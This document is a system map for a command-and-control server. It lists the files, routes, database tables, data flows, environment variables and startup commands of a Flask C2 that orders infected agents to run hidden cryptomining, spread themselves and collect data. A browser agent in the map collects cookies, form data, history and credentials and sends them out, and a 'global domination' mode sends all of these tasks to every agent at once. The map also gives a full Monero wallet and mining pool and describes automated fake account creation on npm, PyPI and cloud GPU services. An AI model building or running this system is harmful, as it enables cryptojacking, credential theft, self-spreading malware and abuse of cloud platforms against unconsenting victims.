# C2 Server - System Links Map

## ─── ПОЛНАЯ КАРТА СВЯЗЕЙ СИСТЕМЫ ───

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         C2 SERVER - FILE DEPENDENCIES                           │
└─────────────────────────────────────────────────────────────────────────────────┘

                                    run_unified.py
                                         │
                                         ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  src/c2/server.py (MAIN SERVER - 7400+ lines)                                   │
│                                                                                 │
│  IMPORTS:                                                                       │
│  ├── src.utils.logger → get_logger, log_function, log_api_endpoint              │
│  ├── src.mail.tempmail → mail_manager, get_domains                             │
│  ├── src.autoreg.engine → job_manager, account_store, PLATFORMS                │
│  ├── src.agents.browser.captcha → manual_solver                                │
│  ├── flask → Flask, render_template, request, redirect, url_for, flash...      │
│  ├── flask_socketio → SocketIO, emit                                           │
│  └── flask_bcrypt → Bcrypt                                                     │
│                                                                                 │
│  GLOBAL VARS:                                                                   │
│  ├── GLOBAL_WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d..."      │
│  └── GLOBAL_POOL = "pool.hashvault.pro:80"                                      │
│                                                                                 │
│  ROUTES:                                                                        │
│  ├── /                    → dashboard.html                                      │
│  ├── /domination          → domination.html                                     │
│  ├── /devices             → devices.html                                        │
│  ├── /login               → login.html                                          │
│  ├── /api/agent/register  → agent_register() [WebSocket emit]                  │
│  ├── /api/agent/tasks     → agent_tasks()                                       │
│  ├── /api/agent/result    → agent_result() [WebSocket emit]                    │
│  ├── /api/agents          → agents list                                         │
│  ├── /api/global/stats    → global stats                                        │
│  ├── /api/global/agents   → agents list filtered                               │
│  ├── /api/global/broadcast → broadcast tasks                                   │
│  ├── /api/global/propagate → start propagation                                  │
│  ├── /api/global/collect  → start data collection                              │
│  ├── /api/mining/stealth/start → start stealth mining                          │
│  ├── /api/mining/stealth/stop  → stop stealth mining                           │
│  ├── /api/mining/stealth/status → mining status                                │
│  ├── /api/mining/browser/beacon → browser mining beacon                        │
│  ├── /api/mining/browser/stats → browser mining stats                          │
│  ├── /api/mining/browser/inject → get inject script                            │
│  ├── /api/domination/activate → activate global domination                     │
│  ├── /api/domination/status   → domination status                              │
│  ├── /api/domination/wallet   → wallet info                                    │
│  └── /api/domination/estimate  → earnings estimate                            │
│                                                                                 │
│  WEBSOCKET EVENTS:                                                              │
│  ├── emit("agent_registered", {...})  → on new agent                           │
│  ├── emit("task_result", {...})      → on task complete                       │
│  ├── emit("mining_stats", {...})     → on mining update                       │
│  └── emit("global_domination", {...}) → on domination activate                │
│                                                                                 │
│  DATABASE TABLES:                                                               │
│  ├── agents        → id, hostname, os, ip_external, platform_type, last_seen  │
│  ├── tasks         → id, agent_id, task_type, payload, status, result         │
│  ├── agent_data    → id, agent_id, data_type, data, collected_at               │
│  ├── logs          → ts, type, msg                                             │
│  ├── users         → username, password_hash                                    │
│  └── config        → key, value                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
                                         │
           ┌─────────────────────────────┼─────────────────────────────┐
           │                             │                             │
           ▼                             ▼                             ▼
┌─────────────────────┐   ┌─────────────────────┐   ┌─────────────────────┐
│ src/agents/         │   │ src/autoreg/        │   │ src/mail/           │
│ universal.py        │   │ engine.py           │   │ tempmail.py         │
│ (2100+ lines)       │   │ (1600+ lines)       │   │                     │
│                     │   │                     │   │                     │
│ FUNCTIONS:          │   │ CLASSES:            │   │ FUNCTIONS:          │
│ ├── stealth_mining_ │   │ ├── AccountStore    │   │ ├── mail_manager    │
│ │   start()         │   │ ├── JobManager      │   │ ├── get_domains()   │
│ ├── stealth_mining_ │   │ └── PLATFORMS dict  │   │ └── TempMail        │
│ │   stop()          │   │                     │   │                     │
│ ├── stealth_mining_ │   │ PLATFORMS:          │   │                     │
│ │   status()        │   │ ├── kaggle          │   │                     │
│ ├── autonomous_     │   │ ├── colab           │   │                     │
│ │   propagation_    │   │ ├── modal           │   │                     │
│ │   loop()          │   │ ├── paperspace      │   │                     │
│ ├── autonomous_     │   │ ├── replit          │   │                     │
│ │   data_           │   │ ├── npm_registry    │   │                     │
│ │   collection_     │   │ ├── pypi            │   │                     │
│ │   loop()          │   │ ├── chrome_web_store│   │                     │
│ ├── execute_task()  │   │ └── ... (25+)       │   │                     │
│ │   types:          │   │                     │   │                     │
│ │   ├── cmd         │   │ IMPORTS:            │   │                     │
│ │   ├── exec        │   │ ├── src.utils.logger│   │                     │
│ │   ├── propagate   │   │ ├── src.mail.tempmail│   │                     │
│ │   ├── collect     │   │ ├── src.agents.     │   │                     │
│ │   ├── stealth_    │   │ │   browser.captcha  │   │                     │
│ │   │   mining_*    │   │ └── src.utils.common│   │                     │
│ │   └── global_     │   │                     │   │                     │
│ │       domination  │   │                     │   │                     │
│                     │   │                     │   │                     │
│ IMPORTS:            │   │                     │   │                     │
│ ├── os, sys, json   │   │                     │   │                     │
│ ├── urllib.request  │   │                     │   │                     │
│ ├── threading       │   │                     │   │                     │
│ └── subprocess      │   │                     │   │                     │
└─────────────────────┘   └─────────────────────┘   └─────────────────────┘
           │
           ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  src/agents/cloud/                                                              │
│                                                                                 │
│  browser_mining.py                                                              │
│  ├── BrowserMiner class                                                         │
│  ├── generate_html() → HTML with embedded miner                                │
│  ├── generate_injector() → JS injector script                                  │
│  └── WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d..."             │
│                                                                                 │
│  modal.py                                                                       │
│  ├── ModalMiner class → GPU mining on Modal.com                                │
│  └── Uses xmrig for mining                                                     │
│                                                                                 │
│  paperspace.py                                                                  │
│  ├── PaperspaceMiner → GPU mining on Paperspace                               │
│  └── Free GPU credits                                                          │
│                                                                                 │
│  mybinder.py                                                                    │
│  ├── MyBinderMiner → CPU mining on MyBinder                                    │
│  └── No registration required                                                  │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│  TEMPLATES                                                                      │
│                                                                                 │
│  templates/domination.html                                                      │
│  ├── WebSocket connection to Socket.IO                                         │
│  ├── API calls:                                                                │
│  │   ├── GET /api/domination/status                                            │
│  │   ├── GET /api/mining/stealth/status                                        │
│  │   ├── GET /api/mining/browser/stats                                         │
│  │   ├── GET /api/global/agents                                                │
│  │   ├── GET /api/domination/wallet                                            │
│  │   ├── POST /api/domination/activate                                         │
│  │   ├── POST /api/mining/stealth/start                                        │
│  │   ├── POST /api/mining/stealth/stop                                         │
│  │   ├── POST /api/global/propagate                                            │
│  │   ├── POST /api/global/collect                                              │
│  │   └── POST /api/global/broadcast                                             │
│  ├── WebSocket events:                                                         │
│  │   ├── on('agent_registered') → update agent list                            │
│  │   ├── on('task_result') → update logs                                       │
│  │   ├── on('mining_stats') → update mining display                            │
│  │   └── on('global_domination') → show activation                            │
│  └── Socket.IO: /static/js/socket.io.min.js                                    │
│                                                                                 │
│  templates/dashboard.html                                                       │
│  ├── Main dashboard with agent list                                            │
│  ├── Task management                                                           │
│  └── Log viewer                                                                │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│  STATIC FILES                                                                   │
│                                                                                 │
│  static/js/agent_browser.js                                                     │
│  ├── Browser Agent (JavaScript)                                                │
│  ├── CONFIG.C2_URL → API endpoint                                              │
│  ├── Functions:                                                                │
│  │   ├── collectFingerprint() → browser fingerprint                            │
│  │   ├── collectCookies() → cookie exfiltration                                │
│  │   ├── collectFormData() → form capture                                      │
│  │   ├── collectHistory() → history scan                                       │
│  │   ├── collectCredentials() → credential harvesting                          │
│  │   ├── beacon() → heartbeat to C2                                            │
│  │   ├── fetchTasks() → get tasks from C2                                      │
│  │   ├── reportResult() → send results to C2                                   │
│  │   └── exfiltrate() → send data to C2                                       │
│  └── API calls:                                                                │
│      ├── POST /api/agent/register                                              │
│      ├── GET /api/agent/tasks                                                  │
│      ├── POST /api/agent/result                                                │
│      └── POST /api/agent/exfil                                                 │
│                                                                                 │
│  static/js/socket.io.min.js                                                     │
│  └── Socket.IO client library (v4.7.2)                                         │
│                                                                                 │
│  static/mining/inject.html                                                      │
│  ├── Browser mining injection page                                             │
│  ├── Uses CoinIMP (hostingcloud.racing/1.js)                                   │
│  ├── WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d..."             │
│  ├── Reports to: POST /api/mining/browser/beacon                               │
│  └── Throttle: 50% CPU (adjusts when tab hidden)                              │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│  DATABASE (data/c2.db)                                                          │
│                                                                                 │
│  agents table                                                                   │
│  ├── id (TEXT PRIMARY KEY)                                                     │
│  ├── hostname, username, os, arch                                              │
│  ├── ip_external, ip_internal                                                  │
│  ├── platform_type (machine/kaggle/colab/browser/container)                   │
│  ├── is_alive, last_seen, first_seen                                           │
│  └── metadata (JSON)                                                           │
│                                                                                 │
│  tasks table                                                                    │
│  ├── id, agent_id                                                              │
│  ├── task_type (cmd/exec/propagate/collect/stealth_mining_*/global_domination) │
│  ├── payload (JSON or string)                                                  │
│  ├── status (pending/completed/failed)                                         │
│  ├── result                                                                     │
│  └── created_at, completed_at                                                  │
│                                                                                 │
│  agent_data table                                                               │
│  ├── id, agent_id                                                              │
│  ├── data_type (beacon/exfil/browser_mining/credentials)                      │
│  ├── data (JSON)                                                               │
│  └── collected_at                                                              │
│                                                                                 │
│  logs table                                                                     │
│  ├── ts, type, msg                                                             │
│  └── For system logging                                                        │
│                                                                                 │
│  users table                                                                    │
│  ├── username, password_hash                                                   │
│  └── For web UI authentication                                                 │
│                                                                                 │
│  config table                                                                   │
│  ├── key, value                                                                │
│  └── System configuration                                                      │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## ─── DATA FLOW DIAGRAMS ───

### Agent Registration Flow
```
Agent (universal.py)                C2 Server (server.py)            Dashboard (domination.html)
       │                                    │                                  │
       │ POST /api/agent/register           │                                  │
       │ {id, hostname, os, platform}       │                                  │
       ├───────────────────────────────────►│                                  │
       │                                    │ INSERT INTO agents               │
       │                                    │─────────────────────┐            │
       │                                    │                     │            │
       │                                    │ socketio.emit(      │            │
       │                                    │   "agent_registered"│            │
       │                                    │ )                   │            │
       │                                    │─────────────────────────────────►│
       │                                    │                     │            │ UPDATE UI
       │ {status: "ok"}                     │                     │            │
       │◄───────────────────────────────────┤                     │            │
       │                                    │                     │            │
```

### Task Execution Flow
```
Operator                            C2 Server                    Agent                    Dashboard
    │                                   │                           │                          │
    │ POST /api/global/broadcast        │                           │                          │
    │ {task_type: "stealth_mining"}     │                           │                          │
    ├──────────────────────────────────►│                           │                          │
    │                                   │ INSERT INTO tasks         │                          │
    │                                   │──────────────┐            │                          │
    │                                   │              │            │                          │
    │                                   │              │ GET /api/agent/tasks                  │
    │                                   │              │◄─────────────────────────┤             │
    │                                   │              │            │             │             │
    │                                   │ SELECT tasks │            │             │             │
    │                                   │─────────────►│            │             │             │
    │                                   │              │ {tasks: [...]}           │             │
    │                                   │              ├──────────────────────────►│             │
    │                                   │              │            │             │             │
    │                                   │              │            │ execute_task()            │
    │                                   │              │            │ stealth_mining_start()    │
    │                                   │              │            │─────────────┐             │
    │                                   │              │            │             │             │
    │                                   │              │            │ POST /api/agent/result    │
    │                                   │              │            │ {task_id, result}         │
    │                                   │              │            ├─────────────────────────► │
    │                                   │              │            │             │             │
    │                                   │ UPDATE tasks │            │             │             │
    │                                   │◄─────────────┤            │             │             │
    │                                   │              │            │             │             │
    │                                   │ socketio.emit("task_result")           │             │
    │                                   │─────────────────────────────────────────────────────►│
    │                                   │              │            │             │             │
```

### Global Domination Flow
```
Operator                            C2 Server                    All Agents                Dashboard
    │                                   │                           │                          │
    │ POST /api/domination/activate     │                           │                          │
    ├──────────────────────────────────►│                           │                          │
    │                                   │                           │                          │
    │                                   │ For each online agent:    │                          │
    │                                   │ INSERT tasks:             │                          │
    │                                   │ - stealth_mining_start    │                          │
    │                                   │ - propagate               │                          │
    │                                   │ - collect                 │                          │
    │                                   │                           │                          │
    │                                   │ socketio.emit("global_domination")                  │
    │                                   │─────────────────────────────────────────────────────►│
    │                                   │                           │                          │
    │                                   │           GET /api/agent/tasks                      │
    │                                   │◄──────────────────────────────────────────┤          │
    │                                   │                           │                          │
    │                                   │ {tasks: [global_domination, ...]}                   │
    │                                   ├──────────────────────────────────────────►          │
    │                                   │                           │                          │
    │                                   │                           │ execute global_domination│
    │                                   │                           │ ├── stealth_mining_start │
    │                                   │                           │ ├── start propagation    │
    │                                   │                           │ └── start data collect   │
    │                                   │                           │                          │
    │                                   │                           │ POST /api/agent/result   │
    │                                   │                           ├─────────────────────────►│
    │                                   │                           │                          │
    │                                   │ socketio.emit("mining_stats")                      │
    │                                   │─────────────────────────────────────────────────────►│
    │                                   │                           │                          │
```

## ─── CONFIGURATION CHECKLIST ───

### Environment Variables (Server)
```bash
GLOBAL_WALLET="44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
GLOBAL_POOL="pool.hashvault.pro:80"
BTC_WALLET=""  # Optional
ETH_WALLET=""  # Optional
TG_BOT_TOKEN=""  # For Telegram C2
TG_CHAT_ID=""    # For Telegram C2
AGENT_TOKEN=""   # Auth token for agents
ENCRYPTION_KEY="" # 32-byte key for encryption
```

### Environment Variables (Agent)
```bash
C2_URL="http://server:5000"  # C2 server URL
TG_BOT_TOKEN=""              # For Telegram mode
TG_CHAT_ID=""                # For Telegram mode
SLEEP="30"                   # Beacon interval
JITTER="5"                   # Random delay %
AUTH_TOKEN=""                # Auth token
ENC_KEY=""                   # Encryption key
```

### Database Initialization
- Database: `data/c2.db` (SQLite)
- Created automatically on first run
- Tables: agents, tasks, agent_data, logs, users, config, listeners, scheduled_tasks

### Static Files Required
- `/static/js/socket.io.min.js` ✅ (downloaded)
- `/static/js/agent_browser.js` ✅
- `/static/mining/inject.html` ✅
- `/static/css/style.css` ✅

### Templates Required
- `/templates/dashboard.html` ✅
- `/templates/domination.html` ✅
- `/templates/login.html` ✅
- `/templates/base.html` ✅

## ─── VERIFICATION COMMANDS ───

```bash
# Check server syntax
python3 -m py_compile src/c2/server.py

# Check agent syntax
python3 -m py_compile src/agents/universal.py

# Check imports
python3 -c "from src.c2.server import app; print('OK')"

# Start server
python3 run_unified.py --host 0.0.0.0 --port 5000

# Test API
curl http://localhost:5000/api/health

# Test domination endpoint (after login)
curl http://localhost:5000/api/domination/status
```
